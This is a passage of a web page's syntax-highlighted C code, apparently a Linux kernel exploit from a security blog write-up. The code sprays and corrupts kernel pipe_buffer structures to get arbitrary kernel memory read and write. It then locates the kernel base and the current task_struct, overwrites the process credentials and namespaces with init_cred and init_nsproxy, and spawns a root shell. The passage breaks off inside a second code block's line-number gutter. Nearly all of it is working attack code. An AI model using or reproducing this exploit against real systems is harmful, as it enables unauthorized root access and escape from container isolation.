close(pipe_list[orig_idx][<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//sleep(2);</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;write down&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; PIPE_NUM; i++)&#123; </span><br><span class="line">        <span class="keyword">if</span> (i == orig_idx || i == victim_idx)&#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (fcntl(pipe_list[i][<span class="number">1</span>], F_SETPIPE_SZ, snd_pipe_sz) &lt; <span class="number">0</span>)&#123; </span><br><span class="line">            <span class="comment">/* 2 * pipe_buffer = 0x60 kmalloc-96 */</span> </span><br><span class="line">            err_exit(<span class="string">&quot;Fcntl Pipe&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(buf,<span class="number">0</span>,<span class="keyword">sizeof</span>(buf));</span><br><span class="line">    read(pipe_list[victim_idx][<span class="number">0</span>], buf, SND_PIPE_BUF_SZ - <span class="number">8</span> - <span class="keyword">sizeof</span>(<span class="keyword">int</span>));</span><br><span class="line">    print_hex(buf,SND_PIPE_BUF_SZ - <span class="number">8</span>);</span><br><span class="line">    read(pipe_list[victim_idx][<span class="number">0</span>], &amp;info_pipe_buf, <span class="keyword">sizeof</span>(info_pipe_buf));</span><br><span class="line">    print_hex((<span class="keyword">char</span>*)&amp;info_pipe_buf,<span class="keyword">sizeof</span>(info_pipe_buf));</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[?] info_pipe_buf-&gt;page: \033[0m%p\n&quot;</span></span><br><span class="line">    <span class="string">&quot;\033[34m\033[1m[?] info_pipe_buf-&gt;ops: \033[0m%p\n&quot;</span>,</span><br><span class="line">    info_pipe_buf.page, info_pipe_buf.ops);</span><br><span class="line"></span><br><span class="line">    info_pipe_buf.page = (struct page *)((<span class="keyword">size_t</span>)info_pipe_buf.page + <span class="number">0x40</span>);</span><br><span class="line">    write(pipe_list[victim_idx][<span class="number">1</span>], &amp;info_pipe_buf, <span class="keyword">sizeof</span>(info_pipe_buf));</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;change pipe_buffer down&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//sleep(2);</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> snd_orig_idx = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">int</span> snd_victim_idx = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; PIPE_NUM; i++)&#123; <span class="comment">/* 第二次堆喷 */</span></span><br><span class="line">        <span class="keyword">int</span> nr;</span><br><span class="line">        <span class="keyword">if</span> (i == orig_idx || i == victim_idx)&#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        read(pipe_list[i][<span class="number">0</span>], &amp;nr, <span class="keyword">sizeof</span>(<span class="keyword">int</span>));</span><br><span class="line">        <span class="keyword">if</span> (i &lt; PIPE_NUM &amp;&amp; i != nr)&#123;</span><br><span class="line">            snd_orig_idx = nr;</span><br><span class="line">            snd_victim_idx = i;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found index-%d and index-%d point the same page \033[0m\n&quot;</span>,snd_victim_idx, snd_orig_idx);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (snd_orig_idx == <span class="number">-1</span> || snd_victim_idx == <span class="number">-1</span>)&#123;</span><br><span class="line">        err_exit(<span class="string">&quot;can&#x27;t find&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">size_t</span> trd_pipe_sz = <span class="number">0x1000</span> * (TRD_PIPE_BUF_SZ / <span class="keyword">sizeof</span>(struct pipe_buffer));</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> <span class="title">evil_pipe_buf</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page_ptr</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(buf,<span class="string">&#x27;k&#x27;</span>,<span class="keyword">sizeof</span>(buf));</span><br><span class="line">    write(pipe_list[snd_victim_idx][<span class="number">1</span>], buf, TRD_PIPE_BUF_SZ - <span class="number">24</span> - <span class="number">3</span> * <span class="keyword">sizeof</span>(<span class="keyword">int</span>));</span><br><span class="line">    close(pipe_list[snd_orig_idx][<span class="number">0</span>]);</span><br><span class="line">    close(pipe_list[snd_orig_idx][<span class="number">1</span>]);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;write down&quot;</span>);</span><br><span class="line">    <span class="comment">//sleep(2);</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; PIPE_NUM; i++)&#123;</span><br><span class="line">        <span class="keyword">if</span> (i == orig_idx || i == victim_idx || i == snd_orig_idx || i == snd_victim_idx)&#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (fcntl(pipe_list[i][<span class="number">1</span>], F_SETPIPE_SZ, trd_pipe_sz) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="comment">/* 4 * pipe_buffer = 0xc0 kmalloc-192 */</span> </span><br><span class="line">            err_exit(<span class="string">&quot;Fcntl Pipe&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;fcntl down&quot;</span>);</span><br><span class="line">    <span class="comment">//sleep(2);</span></span><br><span class="line"></span><br><span class="line">    evil_pipe_buf.page = info_pipe_buf.page;</span><br><span class="line">    evil_pipe_buf.offset = TRD_PIPE_BUF_SZ;</span><br><span class="line">    evil_pipe_buf.len = TRD_PIPE_BUF_SZ;</span><br><span class="line">    evil_pipe_buf.ops = info_pipe_buf.ops;</span><br><span class="line">    evil_pipe_buf.flags = info_pipe_buf.flags;</span><br><span class="line">    evil_pipe_buf.<span class="keyword">private</span> = info_pipe_buf.<span class="keyword">private</span>;</span><br><span class="line"></span><br><span class="line">    write(pipe_list[snd_victim_idx][<span class="number">1</span>], &amp;evil_pipe_buf, <span class="keyword">sizeof</span>(evil_pipe_buf));</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;change pipe_buffer down&quot;</span>);</span><br><span class="line">    <span class="comment">//sleep(2);</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; PIPE_NUM; i++)&#123;</span><br><span class="line">        <span class="keyword">if</span> (i == orig_idx || i == victim_idx || i == snd_orig_idx || i == snd_victim_idx)&#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        read(pipe_list[i][<span class="number">0</span>], &amp;page_ptr, <span class="keyword">sizeof</span>(page_ptr));</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>,page_ptr);</span><br><span class="line">        <span class="keyword">if</span> (page_ptr == evil_pipe_buf.page)&#123;</span><br><span class="line">            self_2nd_pipe_idx = i;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found self-writing pipe:\033[0m%d\n&quot;</span>,</span><br><span class="line">                    self_2nd_pipe_idx);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    evil_pipe_buf.offset = TRD_PIPE_BUF_SZ;</span><br><span class="line">    evil_pipe_buf.len = TRD_PIPE_BUF_SZ;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(buf,<span class="string">&#x27;n&#x27;</span>,<span class="keyword">sizeof</span>(buf));</span><br><span class="line">    write(pipe_list[snd_victim_idx][<span class="number">1</span>], buf, TRD_PIPE_BUF_SZ - <span class="keyword">sizeof</span>(evil_pipe_buf));</span><br><span class="line">    <span class="comment">//sleep(2);</span></span><br><span class="line">    write(pipe_list[snd_victim_idx][<span class="number">1</span>], &amp;evil_pipe_buf, <span class="keyword">sizeof</span>(evil_pipe_buf));</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;change pipe_buffer down&quot;</span>);</span><br><span class="line">    <span class="comment">//sleep(2);</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; PIPE_NUM; i++)&#123;</span><br><span class="line">        <span class="keyword">if</span> (i == orig_idx || i == victim_idx || i == snd_orig_idx || i == snd_victim_idx || i == self_2nd_pipe_idx)&#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        read(pipe_list[i][<span class="number">0</span>], &amp;page_ptr, <span class="keyword">sizeof</span>(page_ptr));</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>,page_ptr);</span><br><span class="line">        <span class="keyword">if</span> (page_ptr == evil_pipe_buf.page)&#123;</span><br><span class="line">            self_3rd_pipe_idx = i;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found self-writing pipe:\033[0m&quot;</span></span><br><span class="line">                    <span class="string">&quot;%d\n&quot;</span>,</span><br><span class="line">                    self_3rd_pipe_idx);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    evil_pipe_buf.offset = TRD_PIPE_BUF_SZ;</span><br><span class="line">    evil_pipe_buf.len = TRD_PIPE_BUF_SZ;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(buf,<span class="string">&#x27;m&#x27;</span>,<span class="keyword">sizeof</span>(buf));</span><br><span class="line">    write(pipe_list[snd_victim_idx][<span class="number">1</span>], buf, TRD_PIPE_BUF_SZ - <span class="keyword">sizeof</span>(evil_pipe_buf));</span><br><span class="line">    <span class="comment">//sleep(2);</span></span><br><span class="line">    write(pipe_list[snd_victim_idx][<span class="number">1</span>], &amp;evil_pipe_buf, <span class="keyword">sizeof</span>(evil_pipe_buf));</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;change pipe_buffer down&quot;</span>);</span><br><span class="line">    <span class="comment">//sleep(2);</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; PIPE_NUM; i++)&#123;</span><br><span class="line">        <span class="keyword">if</span> (i == orig_idx || i == victim_idx || i == snd_orig_idx || i == snd_victim_idx || i == self_2nd_pipe_idx || i == self_3rd_pipe_idx)&#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        read(pipe_list[i][<span class="number">0</span>], &amp;page_ptr, <span class="keyword">sizeof</span>(page_ptr));</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>,page_ptr);</span><br><span class="line">        <span class="keyword">if</span> (page_ptr == evil_pipe_buf.page)&#123;</span><br><span class="line">            self_4th_pipe_idx = i;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found self-writing pipe:\033[0m&quot;</span></span><br><span class="line">                    <span class="string">&quot;%d\n&quot;</span>,</span><br><span class="line">                    self_4th_pipe_idx);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>(&amp;evil_2nd_buf, &amp;info_pipe_buf, <span class="keyword">sizeof</span>(evil_2nd_buf));</span><br><span class="line">    <span class="built_in">memcpy</span>(&amp;evil_3rd_buf, &amp;info_pipe_buf, <span class="keyword">sizeof</span>(evil_3rd_buf));</span><br><span class="line">    <span class="built_in">memcpy</span>(&amp;evil_4th_buf, &amp;info_pipe_buf, <span class="keyword">sizeof</span>(evil_4th_buf));</span><br><span class="line"></span><br><span class="line">    evil_2nd_buf.offset = <span class="number">0</span>;</span><br><span class="line">    evil_2nd_buf.len = <span class="number">0xff0</span>;</span><br><span class="line"></span><br><span class="line">    evil_3rd_buf.offset = TRD_PIPE_BUF_SZ * <span class="number">3</span>;</span><br><span class="line">    evil_3rd_buf.len = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//sleep(2);</span></span><br><span class="line">    write(pipe_list[self_4th_pipe_idx][<span class="number">1</span>], &amp;evil_3rd_buf, <span class="keyword">sizeof</span>(evil_3rd_buf));</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;change pipe_buffer down&quot;</span>);</span><br><span class="line">    <span class="comment">//sleep(2);</span></span><br><span class="line"></span><br><span class="line">    evil_4th_buf.offset = TRD_PIPE_BUF_SZ;</span><br><span class="line">    evil_4th_buf.len = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    vmemmap_base = (<span class="keyword">size_t</span>)info_pipe_buf.page &amp; <span class="number">0xfffffffff0000000</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;vmemmap_start: 0x%lx\n&quot;</span>,vmemmap_base);</span><br><span class="line">    <span class="keyword">for</span> (;;)</span><br><span class="line">    &#123;</span><br><span class="line">        arbitrary_read_by_pipe((struct page *)(vmemmap_base + <span class="number">157</span> * <span class="number">0x40</span>), buf);</span><br><span class="line">        <span class="comment">//printf(&quot;%lx\n&quot;,*(size_t*)buf);</span></span><br><span class="line">        <span class="keyword">if</span> (*(<span class="keyword">uint64_t</span> *)buf &gt; <span class="number">0xffffffff81000000</span> &amp;&amp; ((*(<span class="keyword">uint64_t</span> *)buf &amp; <span class="number">0xfff</span>) == <span class="number">0x070</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            kernel_base = *(<span class="keyword">uint64_t</span> *)buf - <span class="number">0x070</span>;</span><br><span class="line">            kernel_offset = kernel_base - <span class="number">0xffffffff81000000</span>;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found kernel base: \033[0m0x%lx\n&quot;</span></span><br><span class="line">                    <span class="string">&quot;\033[32m\033[1m[+] Kernel offset: \033[0m0x%lx\n&quot;</span>,</span><br><span class="line">                    kernel_base, kernel_offset);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        vmemmap_base -= <span class="number">0x10000000</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] vmemmap_base:\033[0m 0x%lx\n\n&quot;</span>, vmemmap_base);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint64_t</span> parent_task, current_task;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Seeking task_struct in memory...&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint64_t</span> *comm_addr = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">uint64_t</span> *point_buf = <span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> target[<span class="number">0x20</span>];</span><br><span class="line">    <span class="built_in">strcpy</span>(target, <span class="string">&quot;8888888888&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (prctl(PR_SET_NAME, target, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>) != <span class="number">0</span>)&#123;</span><br><span class="line">        err_exit(<span class="string">&quot;cannot set name&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; <span class="number">1</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        arbitrary_read_by_pipe((struct page *)(vmemmap_base + i * <span class="number">0x40</span>), point_buf);</span><br><span class="line"></span><br><span class="line">        comm_addr = memmem(point_buf, <span class="number">0xf00</span>, target, <span class="built_in">strlen</span>(target));</span><br><span class="line">        <span class="keyword">if</span> (comm_addr &amp;&amp; (comm_addr[<span class="number">-2</span>] &gt; <span class="number">0xffff888000000000</span>) <span class="comment">/* task-&gt;cred */</span></span><br><span class="line">        &amp;&amp; (comm_addr[<span class="number">-3</span>] &gt; <span class="number">0xffff888000000000</span>) <span class="comment">/* task-&gt;real_cred */</span></span><br><span class="line">        &amp;&amp; (comm_addr[<span class="number">-57</span>] &gt; <span class="number">0xffff888000000000</span>) <span class="comment">/* task-&gt;read_parent */</span></span><br><span class="line">        &amp;&amp; (comm_addr[<span class="number">-56</span>] &gt; <span class="number">0xffff888000000000</span>)) <span class="comment">/* task-&gt;parent */</span></span><br><span class="line">        &#123;</span><br><span class="line">            parent_task = comm_addr[<span class="number">-57</span>];</span><br><span class="line"></span><br><span class="line">            current_task = comm_addr[<span class="number">-50</span>] - <span class="number">2528</span>;</span><br><span class="line">            page_offset_base = (comm_addr[<span class="number">-50</span>] &amp; <span class="number">0xfffffffffffff000</span>) - i * <span class="number">0x1000</span>;</span><br><span class="line">            page_offset_base &amp;= <span class="number">0xfffffffff0000000</span>;</span><br><span class="line"></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found task_struct on page: \033[0m%p\n&quot;</span>,</span><br><span class="line">                    (struct page *)(vmemmap_base + i * <span class="number">0x40</span>));</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] page_offset_base: \033[0m0x%lx\n&quot;</span>,</span><br><span class="line">                    page_offset_base);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] current task_struct&#x27;s addr: \033[0m0x%lx\n&quot;</span>,</span><br><span class="line">                    current_task);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] parent task_struct&#x27;s addr: \033[0m0x%lx\n\n&quot;</span>,</span><br><span class="line">                    parent_task);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Seeking for init_task...&quot;</span>);</span><br><span class="line">    <span class="keyword">uint64_t</span> *tsk_buf;</span><br><span class="line">    <span class="comment">/* 调试时通过解析task_struct-&gt;parent(offset=309*8)的方式向上一直找到init进程 */</span></span><br><span class="line">    <span class="keyword">uint64_t</span> init_task = kernel_offset + <span class="number">0xffffffff8301bb80</span>;</span><br><span class="line">    <span class="keyword">uint64_t</span> init_cred = kernel_offset + <span class="number">0xffffffff83079ee8</span>; <span class="comment">// task-&gt;cred(offset=363*8)</span></span><br><span class="line">    <span class="keyword">uint64_t</span> init_nsproxy = kernel_offset + <span class="number">0xffffffff83079b40</span>; <span class="comment">// task-&gt;nsproxy (offset=377*8)</span></span><br><span class="line">    <span class="comment">//sleep(5);</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found init_task: \033[0m0x%lx\n&quot;</span>, init_task);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found init_cred: \033[0m0x%lx\n&quot;</span>, init_cred);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found init_nsproxy:\033[0m0x%lx\n&quot;</span>, init_nsproxy);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Escalating ROOT privilege now...&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">size_t</span> current_task_page = direct_map_addr_to_page_addr(current_task);</span><br><span class="line"></span><br><span class="line">    arbitrary_read_by_pipe((struct page *)current_task_page, buf);</span><br><span class="line">    arbitrary_read_by_pipe((struct page *)(current_task_page + <span class="number">0x40</span>), &amp;buf[<span class="number">512</span> * <span class="number">8</span>]);</span><br><span class="line"></span><br><span class="line">    tsk_buf = (<span class="keyword">size_t</span> *)((<span class="keyword">size_t</span>)buf + (current_task &amp; <span class="number">0xfff</span>));</span><br><span class="line">    tsk_buf[<span class="number">363</span>] = init_cred;</span><br><span class="line">    tsk_buf[<span class="number">364</span>] = init_cred;</span><br><span class="line">    tsk_buf[<span class="number">377</span>] = init_nsproxy;</span><br><span class="line"></span><br><span class="line">    arbitrary_write_by_pipe((struct page *)current_task_page, buf, <span class="number">0xff0</span>);</span><br><span class="line">    arbitrary_write_by_pipe((struct page *)(current_task_page + <span class="number">0x40</span>),&amp;buf[<span class="number">512</span> * <span class="number">8</span>], <span class="number">0xff0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] Done.\n&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] checking for root...&quot;</span>);</span><br><span class="line"></span><br><span class="line">    get_root_shell();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span 